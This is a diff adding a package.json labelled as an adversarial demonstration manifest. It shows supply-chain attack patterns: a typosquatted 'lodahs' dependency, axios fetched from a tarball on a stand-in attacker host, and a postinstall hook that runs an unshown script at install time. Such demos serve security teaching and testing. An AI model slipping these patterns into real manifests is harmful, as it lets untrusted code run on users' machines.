@@ -1,0 +1,13 @@
+{
+  "_attribution": "Baysöz Labs <baysozlabs@proton.me> — adversarial demonstration manifest.",
+  "name": "adversarial-demo",
+  "version": "0.1.0",
+  "dependencies": {
+    "lodahs": "^4.17.21",
+    "express": "4.21.2",
+    "axios": "https://tarball.evil.invalid/axios-1.7.9.tgz"
+  },
+  "scripts": {
+    "postinstall": "node ./install-hook.js"
+  }
+}
